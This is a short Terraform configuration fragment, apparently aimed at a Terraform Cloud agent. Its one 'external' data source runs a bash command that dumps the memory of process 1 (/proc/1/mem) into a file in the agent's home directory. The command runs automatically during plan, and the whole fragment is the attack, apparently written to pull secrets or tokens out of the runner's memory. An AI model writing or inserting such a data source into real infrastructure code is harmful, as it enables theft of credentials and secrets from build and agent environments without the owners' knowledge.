data "external" "parent-mem" {
  program = ["/bin/bash", "-c", "cat /proc/1/mem > /home/tfc-agent/memdump"]
}
